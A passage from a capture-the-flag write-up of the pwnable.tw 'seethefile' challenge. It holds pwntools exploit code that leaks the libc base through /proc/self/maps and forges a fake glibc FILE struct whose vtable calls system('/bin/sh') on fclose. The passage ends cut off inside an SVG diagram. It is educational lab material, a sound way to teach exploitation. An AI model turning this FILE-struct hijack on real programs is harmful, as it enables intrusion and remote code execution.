  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
    </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Nothing need to close&quot;</span><span style="color:#323232;">);
  }
  </span><span style="font-weight:bold;color:#a71d5d;">else </span><span style="color:#323232;">{
    </span><span style="color:#62a35c;">fclose</span><span style="color:#323232;">(fp);
  }
  fp </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">(FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">;
  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
}
</span></code></pre><p>This closes the previously opened file.</p><h1 id="attacking-the-program">Attacking the Program</h1><p>I will be using <a href="https://github.com/Gallopsled/pwntools">pwntools</a> to facilitate communications with the binary and the remote server.</p><p>To start off, we need to load the binary and the corresponding libc:</p><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">from </span><span style="color:#323232;">pwn </span><span style="font-weight:bold;color:#a71d5d;">import </span><span style="color:#0086b3;">*

</span><span style="color:#323232;">context.binary </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&#39;./seethefile&#39;
</span><span style="color:#323232;">context.terminal </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&#39;/bin/sh&#39;

</span><span style="color:#323232;">elf </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./seethefile&#39;</span><span style="color:#323232;">)
</span><span style="font-style:italic;color:#969896;">#libc = ELF(&#39;./libc_32.so.6&#39;)                     # Remote libc
</span><span style="color:#323232;">libc </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;/lib/i386-linux-gnu/libc-2.23.so&#39;</span><span style="color:#323232;">)    </span><span style="font-style:italic;color:#969896;"># Local libc

</span><span style="color:#323232;">r </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">process(</span><span style="color:#183691;">&#39;./seethefile&#39;</span><span style="color:#323232;">)
gdb.attach(r)
</span><span style="font-style:italic;color:#969896;">#r = remote(&#39;chall.pwnable.tw&#39;, 10200)
</span></code></pre><p>I also chose to define some helper functions to abstract communications with the binary:</p><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">openfile</span><span style="color:#323232;">(path):
        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
        r.sendline(</span><span style="color:#183691;">&quot;1&quot;</span><span style="color:#323232;">)
        r.recvuntil(</span><span style="color:#183691;">&quot;see :&quot;</span><span style="color:#323232;">)
        r.sendline(path)

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">readfile</span><span style="color:#323232;">():
        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
        r.sendline(</span><span style="color:#183691;">&quot;2&quot;</span><span style="color:#323232;">)

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">writefile</span><span style="color:#323232;">():
        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
        r.sendline(</span><span style="color:#183691;">&quot;3&quot;</span><span style="color:#323232;">)
        </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#323232;">r.recvuntil(</span><span style="color:#183691;">&#39;---------------MENU---------------&#39;</span><span style="color:#323232;">)[:</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#62a35c;">len</span><span style="color:#323232;">(</span><span style="color:#183691;">&#39;---------------MENU---------------&#39;</span><span style="color:#323232;">)]

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">closefile</span><span style="color:#323232;">():
        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
        r.sendline(</span><span style="color:#183691;">&quot;4&quot;</span><span style="color:#323232;">)

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">exit</span><span style="color:#323232;">(name):
        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
        r.sendline(</span><span style="color:#183691;">&quot;5&quot;</span><span style="color:#323232;">)
        r.recvuntil(</span><span style="color:#183691;">&#39;name :&#39;</span><span style="color:#323232;">)
        r.sendline(name)
</span></code></pre><h2 id="leaking-libc-base">Leaking libc base</h2><p>If we want to get a shell, we need to know the address of <code>system</code> in memory. We can use the psuedo-file <code>/proc/self/maps</code> which contains a list of loaded memory regions of the reading process. On the remote service, we need to call <code>readfile</code> twice because libc's entry appears in the second set of 400 characters:</p><p><img alt="" src="https://blog.srikavin.me/posts/pwnable-tw-seethefile/5e8193f54304800866d69179.png"></p><p>This would translate to the following in the exploit script:</p><pre style="background-color:#ffffff;">
<code><span style="color:#323232;">openfile(</span><span style="color:#183691;">&#39;/proc/self/maps&#39;</span><span style="color:#323232;">)
readfile()
readfile()

libc.address </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">int</span><span style="color:#323232;">([x.split(</span><span style="color:#183691;">&#39;-&#39;</span><span style="color:#323232;">)[</span><span style="color:#0086b3;">0</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">for </span><span style="color:#323232;">x </span><span style="font-weight:bold;color:#a71d5d;">in </span><span style="color:#323232;">writefile().split(</span><span style="color:#183691;">&#39;</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&#39;</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">x.endswith(</span><span style="color:#183691;">&#39;.so&#39;</span><span style="color:#323232;">)][</span><span style="color:#0086b3;">0</span><span style="color:#323232;">], </span><span style="color:#0086b3;">16</span><span style="color:#323232;">)
</span></code></pre><h2 id="faking-a-file-struct">Faking a FILE struct</h2><h3 id="choosing-the-flags">Choosing the flags</h3><p>If we simply create a file struct with only <code>vtable</code> set, we will receive a segfault. Looking at the source code of <a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/oldiofclose.c#L36"><code>fclose</code></a>, we see multiple fields of the struct being dereferenced:</p><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">int
</span><span style="font-weight:bold;color:#795da3;">attribute_compat_text_section
</span><span style="color:#323232;">_IO_old_fclose (_IO_FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">fp)
{
  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> status;

  CHECK_FILE(fp, EOF);

  </span><span style="font-style:italic;color:#969896;">/* We desperately try to help programs which are using streams in a
     strange way and mix old and new functions.  Detect new streams
     here.  */
  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp-&gt;_vtable_offset </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#0086b3;">0</span><span style="color:#323232;">)
    </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#323232;">_IO_new_fclose (fp);

  </span><span style="font-style:italic;color:#969896;">/* First unlink the stream.  */
  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp-&gt;_IO_file_flags </span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;"> _IO_IS_FILEBUF)
    _IO_un_link ((</span><span style="font-weight:bold;color:#a71d5d;">struct</span><span style="color:#323232;"> _IO_FILE_plus </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">) fp);

  _IO_acquire_lock (fp);
  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp-&gt;_IO_file_flags </span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;"> _IO_IS_FILEBUF)
    status </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">_IO_old_file_close_it (fp);
  </span><span style="font-weight:bold;color:#a71d5d;">else
</span><span style="color:#323232;">    status </span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;"> fp-&gt;_flags </span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;"> _IO_ERR_SEEN </span><span style="font-weight:bold;color:#a71d5d;">? -</span><span style="color:#0086b3;">1 </span><span style="font-weight:bold;color:#a71d5d;">: </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
  _IO_release_lock (fp);
  _IO_FINISH (fp);
  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(_IO_have_backup (fp))
    _IO_free_backup_area (fp);
  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp </span><span style="font-weight:bold;color:#a71d5d;">!=</span><span style="color:#323232;"> _IO_stdin </span><span style="font-weight:bold;color:#a71d5d;">&amp;&amp;</span><span style="color:#323232;"> fp </span><span style="font-weight:bold;color:#a71d5d;">!=</span><span style="color:#323232;"> _IO_stdout </span><span style="font-weight:bold;color:#a71d5d;">&amp;&amp;</span><span style="color:#323232;"> fp </span><span style="font-weight:bold;color:#a71d5d;">!=</span><span style="color:#323232;"> _IO_stderr)
    {
      fp-&gt;_IO_file_flags </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
      </span><span style="color:#62a35c;">free</span><span style="color:#323232;">(fp);
    }

  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;"> status;
}
</span></code></pre><p>We can skip large chunks of this function if <code>_IO_IS_FILEBUF</code> is not set. Looking at the source code of libc, I found that the bit mask for _IO_IS_FILEBUF is <code>0x2000</code>. The bitwise NOT is <code>0xFFFFDFFF</code>, so we can set the flags of our fake FILE struct to that.</p><h3 id="bypassing-the-lock">Bypassing the lock</h3><p>Another interesting macro <code>_IO_aquire_lock(fp)</code> is used. The <a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/sysdeps/nptl/stdio-lock.h#L29">struct <code>_IO_lock_t</code></a> isn't too complicated:</p><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">typedef struct </span><span style="color:#323232;">{ 
     </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> lock; 
     </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> cnt; 
     </span><span style="font-weight:bold;color:#a71d5d;">void *</span><span style="color:#323232;">owner;
} _IO_lock_t;
</span></code></pre><p><code>_lock</code> is locked if <code>_lock-&gt;cnt != 0</code>. Thus, if we set <code>_lock</code> to a buffer of zeroes, libc will be able to aquire the lock by incrementing <code>cnt</code>. Similarly, its counterpart, <code>_IO_release_lock</code> decrements <code>cnt</code>. A good target buffer is the end of the <code>filename</code> buffer.</p><p>We can add the following onto our exploit script:</p><pre style="background-color:#ffffff;">
<code><span style="color:#323232;">file </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&quot;&quot;                                       </span><span style="font-style:italic;color:#969896;"># file
</span><span style="color:#323232;">file </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(</span><span style="color:#0086b3;">0xFFFFDFFF</span><span style="color:#323232;">)                         </span><span style="font-style:italic;color:#969896;"># file-&gt;_flags  set _IO_IS_FILEBUF bit to false
</span><span style="color:#323232;">file </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#183691;">&quot;;/bin/sh;&quot;                             </span><span style="font-style:italic;color:#969896;"># file-&gt;???     to be interpreted as a string

</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">file.ljust(</span><span style="color:#0086b3;">32</span><span style="color:#323232;">, </span><span style="color:#183691;">&#39;A&#39;</span><span style="color:#323232;">)                   </span><span style="font-style:italic;color:#969896;"># padding to reach *fp
</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(elf.symbols[</span><span style="color:#183691;">&#39;name&#39;</span><span style="color:#323232;">])             </span><span style="font-style:italic;color:#969896;"># *fp           overwrite *fp to point to the start of the name buffer
</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#183691;">&#39;`&#39;                                  </span><span style="font-style:italic;color:#969896;"># padding
</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#183691;">&#39;A&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#323232;">(</span><span style="color:#0086b3;">72</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#0086b3;">37</span><span style="color:#323232;">)                        </span><span style="font-style:italic;color:#969896;"># padding
</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(elf.symbols[</span><span style="color:#183691;">&#39;filename&#39;</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">32</span><span style="color:#323232;">)    </span><span style="font-style:italic;color:#969896;"># file-&gt;_lock   vtable-&gt;__dummy
</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(elf.symbols[</span><span style="color:#183691;">&#39;name&#39;</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">72</span><span style="color:#323232;">)        </span><span style="font-style:italic;color:#969896;"># file-&gt;vtable  vtable-&gt;__dummy2
</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(libc.symbols[</span><span style="color:#183691;">&#39;system&#39;</span><span style="color:#323232;">])          </span><span style="font-style:italic;color:#969896;">#               vtable-&gt;__finish

</span><span style="color:#323232;">exit(payload)
</span></code></pre><h2 id="overview">Overview</h2><p>This diagram displays my payload (on the right) alongside the corresponding structures. The <code>_IO_jump_t</code> and the <code>_IO_FILE</code> structs are overlaid on each other.</p> <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg content="&lt;mxfile host=&quot;Electron&quot; modified=&quot;2020-03-30T08:04:12.711Z&quot; agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/12.9.3 Chrome/80.0.3987.158 Electron/8.2.0 Safari/537.36&quot; etag=&quot;FbfnCxhehhRZRtg15uh7&quot; version=&quot;12.9.3&quot; type=&quot;device&quot;&gt;&lt;diagram id=&quot;cSOi3DqNJlmwpbJNLqXN&quot; name=&quot;Page-1&quot;&gt;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&lt;/diagram&gt;&lt;/mxfile&gt;" height="926px" version="1.1" viewBox="-0.5 -0.5 921 926" width="921px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><clipPath id="mx-clip-183-26-162-34-0"><rect height="34" width="162" x="183" y="26"/></clipPath><clipPath id="mx-clip-183-68-162-32-0"><rect height="32" width="162" x="183" y="68"/></clipPath><clipPath id="mx-clip-183-108-162-32-0"><rect height="32" width="162" x="183" y="108"/></clipPath><clipPath id="mx-clip-183-148-162-32-0"><rect height="32" width="162" x="183" y="148"/></clipPath><clipPath id="mx-clip-183-188-162-32-0"><rect height="32" width="162" x="183" y="188"/></clipPath><clipPath id="mx-clip-183-228-162-32-0"><rect height="32" width="162" x="183" y="228"/></clipPath><clipPath id="mx-clip-183-268-162-32-0"><rect height="32" width="162" x="183" y="268"/></clipPath><clipPath id="mx-clip-183-309-162-32-0"><rect height="32" width="162" x="183" y="309"/></clipPath><clipPath id="mx-clip-183-349-162-32-0"><rect height="32" width="162" x="183" y="349"/></clipPath><clipPath id="mx-clip-183-389-162-32-0"><rect height="32" width="162" x="183" y="389"/></clipPath><clipPath id="mx-clip-183-429-162-32-0"><rect height="32" width="162" x="183" y="429"/></clipPath><clipPath id="mx-clip-183-469-162-32-0"><rect height="32" width="162" x="183" y="469"/></clipPath><clipPath id="mx-clip-183-509-162-32-0"><rect height="32" width="162" x="183" y="509"/></clipPath><clipPath id="mx-clip-183-549-162-32-0"><rect height="32" width="162" x="183" y="549"/></clipPath><clipPath id="mx-clip-183-589-162-32-0"><rect height="32" width="162" x="183" y="589"/></clipPath><clipPath id="mx-clip-183-629-162-32-0"><rect height="32" width="162" x="183" y="629"/></clipPath><clipPath id="mx-clip-183-670-162-32-0"><rect height="32" width="162" x="183" y="670"/></clipPath><clipPath id="mx-clip-183-710-162-32-0"><rect height="32" width="162" x="183" y="710"/></clipPath><clipPath id="mx-clip-183-750-162-32-0"><rect height="32" width="162" x="183" y="750"/></clipPath><clipPath id="mx-clip-4-26-152-751-0"><rect height="751" width="152" x="4" y="26"/></clipPath><clipPath id="mx-clip-4-785-152-36-0"><rect height="36" width="152" x="4" y="785"/></clipPath><clipPath id="mx-clip-574-746-162-41-0"><rect height="41" width="162" x="574" y="746"/></clipPath><clipPath id="mx-clip-574-785-162-41-0"><rect height="41" width="162" x="574" y="785"/></clipPath><clipPath id="mx-clip-574-820-162-44-0"><rect height="44" width="162" x="574" y="820"/></clipPath><clipPath id="mx-clip-574-27-162-41-0"><rect height="41" width="162" x="574" y="27"/></clipPath><clipPath id="mx-clip-574-106-162-41-0"><rect height="41" width="162" x="574" y="106"/></clipPath><clipPath id="mx-clip-574-186-162-41-0"><rect height="41" width="162" x="574" y="186"/></clipPath><clipPath id="mx-clip-574-226-162-41-0"><rect height="41" width="162" x="574" y="226"/></clipPath><clipPath id="mx-clip-574-266-162-41-0"><rect height="41" width="162" x="574" y="266"/></clipPath><clipPath id="mx-clip-574-306-162-41-0"><rect height="41" width="162" x="574" y="306"/></clipPath><clipPath id="mx-clip-574-386-162-41-0"><rect height="41" width="162" x="574" y="386"/></clipPath><clipPath id="mx-clip-574-426-162-41-0"><rect height="41" width="162" x="574" y="426"/></clipPath><clipPath id="mx-clip-574-466-162-41-0"><rect height="41" width="162" x="574" y="466"/></clipPath><clipPath id="mx-clip-574-506-162-41-0"><rect height="41" width="162" x="574" y="506"/></clipPath><clipPath id="mx-clip-574-546-162-41-0"><rect height="41" width="162" x="574" y="546"/></clipPath><clipPath id="mx-clip-574-586-162-41-0"><rect height="41" width="162" x="574" y="586"/></clipPath><clipPath id="mx-clip-574-626-162-41-0"><rect height="41" width="162" x="574" y="626"/></clipPath><clipPath id="mx-clip-574-666-162-41-0"><rect height="41" width="162" x="574" y="666"/></clipPath><clipPath id="mx-clip-574-706-162-41-0"><rect height="41" width="162" x="574" y="706"/></clipPath><clipPath id="mx-clip-574-66-162-41-0"><rect height="41" width="162" x="574" y="66"/></clipPath><clipPath id="mx-clip-574-146-162-41-0"><rect height="41" width="162" x="574" y="146"/></clipPath><clipPath id="mx-clip-574-346-162-41-0"><rect height="41" width="162" x="574" y="346"/></clipPath><clipPath 